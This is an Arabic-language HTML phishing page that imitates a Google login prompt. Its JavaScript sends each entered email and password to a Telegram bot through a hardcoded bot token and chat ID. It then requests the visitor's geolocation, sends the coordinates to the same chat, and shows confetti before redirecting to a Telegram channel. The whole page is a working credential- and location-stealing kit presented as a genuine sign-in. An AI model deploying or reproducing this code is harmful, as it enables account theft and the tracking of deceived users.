<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://i.pinimg.com/736x/dc/9d/41/dc9d4149758055ed003a52ff47707520.jpg');
      background-size: cover;
      background-position: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-container, .location-container {
      background-color: #ffffffdd;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      text-align: center;
      width: 320px;
      display: none;
    }

    .login-container.active, .location-container.active {
      display: block;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      padding: 10px 20px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }

    #countdown {
      margin-top: 20px;
      font-size: 28px;
      font-weight: bold;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <!-- واجهة تسجيل الدخول -->
  <div class="login-container active" id="login">
    <h2>قم بتسجيل الدخول إلى Google للمتابعة</h2>
    <input type="email" placeholder="البريد الإلكتروني" id="email">
    <input type="password" placeholder="كلمة المرور" id="password">
    <button onclick="goToLocation()">تسجيل الدخول</button>
  </div>

  <!-- واجهة الموقع والعداد -->
  <div class="location-container" id="locationBox">
    <h3>يرجى تفعيل الموقع للمتابعة</h3>
    <button onclick="requestLocation()">تفعيل الموقع</button>
    <div id="countdown" style="visibility:hidden;">5</div>
  </div>

  <canvas id="confetti"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script>
    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
    const CHAT_ID = "6028485445";
    let seconds = 5;

    function goToLocation() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (email === "" || password === "") {
        alert("يرجى ملء جميع الحقول");
        return;
      }

      // إرسال المعلومات إلى Telegram
      const msg = `📩 تسجيل دخول جديد:\n\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
        .then(() => {
          // عرض واجهة الموقع بعد الإرسال
          document.getElementById("login").classList.remove("active");
          document.getElementById("locationBox").classList.add("active");
        })
        .catch(() => {
          alert("حدث خطأ أثناء الإرسال.");
        });
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
            .catch(() => {});

          // confetti effect
          confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });

          // إخفاء الزر، إظهار العداد
          document.querySelector("#locationBox button").style.display = "none";
          const countdownEl = document.getElementById("countdown");
          countdownEl.style.visibility = "visible";
          countdownEl.innerText = seconds;

          const interval = setInterval(() => {
            seconds--;
            countdownEl.innerText = seconds;
            if (seconds === 0) {
              clearInterval(interval);
              window.location.href = "https://t.me/sswq22";
            }
          }, 1000);
        }, () => {
          alert("لم يتم السماح بالموقع.");
        });
      }
    }
  </script>
</body>
</html>
